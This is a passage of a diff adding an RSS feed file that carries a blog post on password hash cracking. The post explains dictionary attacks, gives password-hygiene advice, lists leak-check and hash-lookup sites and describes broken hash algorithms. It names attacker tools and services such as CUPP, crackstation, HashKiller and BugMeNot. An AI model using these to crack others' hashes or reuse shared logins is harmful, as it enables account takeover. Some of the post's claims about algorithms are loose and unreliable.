+&lt;/h2&gt;&lt;p&gt;Based on the calculations shown in the previous section, we&amp;rsquo;re convinced that Hash Cracking is difficult. So, one question arises: why does an attacker attempt to crack a hash when it would take such a long time? When an attacker gains access to a list of Hash Protected Passwords (from a Compromised Database or any other method), they run a dictionary attack instead of brute force. Because the main aim here is to crack as many passwords as possible instead of targeting a specific one, the attacker would obtain passwords that were present in the wordlist. In such scenarios, the success rate of Hash Cracking is higher than expected.&lt;/p&gt;
+&lt;h2 id=&#34;security-measure-against-hash-cracking&#34;&gt;Security Measure against Hash Cracking
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/security.jpg&#34;
+	width=&#34;710&#34;
+	height=&#34;400&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/security_hu4729459122753097169.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/security_hu1248179033021697295.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Security&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+You might think that keeping a 20-character-long password and using all 128 Characters would protect you from an attacker attempting to crack the hash. But that&amp;rsquo;s not always true. It would make no difference if that specific 20-character-long password is present in the wordlist used by the attacker in a dictionary attack.&lt;br /&gt;
+Also, creating a password that contains your Name, Date of Birth, Family Member&amp;rsquo;s Name, or any other personal information is not considered secure. It won&amp;rsquo;t take much time to make a custom wordlist that contains combinations of this personal information from programs like CUPP and run a dictionary attack to crack your password.&lt;br /&gt;
+So, to enhance the Security of your password, here are a few points to keep in mind:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use a long password: The above table shows that cracking time significantly increases with password length. We can make a small sentence with spelling mistakes that can be used as your password.&lt;/li&gt;
+&lt;li&gt;Use Lowercase + Uppercase ASCII Letters + Numbers + Special Characters: cracking time significantly increases. Also, we can include spaces and some characters other than the English Alphabet (I think that would work on most of the websites)&lt;/li&gt;
+&lt;li&gt;Keep All Passwords Different: An attacker could access another asset using a password cracked from somewhere else. We surf the Internet, and we all have to put passwords for various websites that can&amp;rsquo;t be trusted, so keeping different passwords would make sure that a breach from any of these websites won&amp;rsquo;t affect our significant assets (like Google Account, etc.)&lt;/li&gt;
+&lt;li&gt;Enable Double Factor Authentication: Even if all of the above methods fail or your password was compromised by some other means (Phishing, etc), you would be secure if you&amp;rsquo;ve enabled double-factor authentication correctly. You would be notified by anyone trying to access your account with the correct password and would need your action to continue further&lt;/li&gt;
+&lt;li&gt;Change your Passwords after specific periods: We don&amp;rsquo;t know how our data is being used because it&amp;rsquo;s not always possible to tell how things work under the hood. Whether our passwords are hashed at the backend (with/without salts) or stored as plain text, if that&amp;rsquo;s not what you think, then there won&amp;rsquo;t be any wordlists like rockyou. It is impossible to check whether someone else has your password. Even if someone targets you, you can enhance your Security and privacy by changing your password regularly (after six months).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;note&#34;&gt;Note
+&lt;/h3&gt;&lt;p&gt;The above points do not Guarantee 100% Protection; they only enhance Security.&lt;/p&gt;
+&lt;h2 id=&#34;checking-leaked-passwords&#34;&gt;Checking Leaked Passwords
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/database_leak.jpg&#34;
+	width=&#34;1200&#34;
+	height=&#34;675&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/database_leak_hu15606094843707238069.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/database_leak_hu12382051111320609846.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Database Leak&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+There are several websites you can use to check whether your password has been leaked somewhere online or not. Here are some popular ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Have I Been Pwned&lt;/a&gt;: Check if your email or phone is in a data breach&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.dehashed.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Dehashed&lt;/a&gt;: Free deep-web scans and protection against credential leaks&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakcheck.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakCheck.io&lt;/a&gt;: Make sure your credentials haven&amp;rsquo;t been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;crackstation.net&lt;/a&gt;: Massive pre-computed lookup tables to crack password hashes&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashkiller.io/listmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HashKiller&lt;/a&gt;: Pre-cracked Hashes, easily searchable&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakedpassword.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakedPassword&lt;/a&gt;: Search across multiple data breaches to see if your pass has been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bugmenot.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;BugMeNot&lt;/a&gt;: Find and share logins&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;Source: &lt;a class=&#34;link&#34; href=&#34;https://github.com/edoardottt/awesome-hacker-search-engines&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;edoardottt/awesome-hacker-search-engines&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;broken-hashing-algorithms&#34;&gt;Broken Hashing Algorithms
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/weak_crypto_algo.png&#34;
+	width=&#34;1500&#34;
+	height=&#34;900&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/weak_crypto_algo_hu1574552661041515237.png 480w, http://localhost:1313/p/password-cracking/assets/images/weak_crypto_algo_hu15285761037877453571.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Weak Encryption Algorithms&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;400px&#34;
+	
+&gt;&lt;br /&gt;
+Broken hashing algorithms refer to cryptographic hash functions that have been compromised in some way, making them unsuitable for security purposes. Some hashing algorithms have been found to have vulnerabilities that allow attackers to exploit weaknesses in the algorithm, potentially leading to collisions (two different inputs producing the same hash value), pre-image attacks (deriving the original input from its hash value), or other security breaches. Some well-known examples of broken hashing algorithms include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;md5: MD5 was widely used but has been found to have multiple vulnerabilities, including collision attacks. It is considered cryptographically broken and unsuitable for further use in secure applications.&lt;/li&gt;
+&lt;li&gt;sha1: SHA-1 is another widely used hashing algorithm that has been demonstrated to have vulnerabilities. Collision attacks against SHA-1 have been demonstrated, making it insecure for many cryptographic applications.&lt;/li&gt;
+&lt;li&gt;sha0: An earlier version of the SHA algorithm, SHA-0, was quickly replaced by SHA-1 due to vulnerabilities found in it.&lt;/li&gt;
+&lt;li&gt;RIPEMD-160 (RACE Integrity Primitives Evaluation Message Digest 160): Although not as widely used as MD5 or SHA-1, RIPEMD-160 has also been found to have vulnerabilities and is considered broken.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;It&amp;rsquo;s essential to use modern and secure hashing algorithms, such as SHA-256, SHA-3, or bcrypt, for cryptographic purposes to ensure data integrity and security. Additionally, algorithms should be regularly evaluated for potential weaknesses, and older algorithms should be replaced as needed to maintain security standards.&lt;/p&gt;
+&lt;h3 id=&#34;note-1&#34;&gt;Note
+&lt;/h3&gt;&lt;p&gt;We&amp;rsquo;ve only discussed Offline Password Cracking because Online Password cracking by Brute Forcing Login Services would be infeasible in today&amp;rsquo;s scenario. After all, IPs would get blocked after a certain number of times. The process would be too slow even if we try to log in with proxies (different IPs).&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Archives</title>
+        <link>http://localhost:1313/archives/</link>
+        <pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/archives/</guid>
+        <description></description>
+        </item>
+        <item>
+        <title>Search</title>
+        <link>http://localhost:1313/search/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/search/</guid>
+        <description></description>
+        </item>
+        
+    </channel>
+</rss>
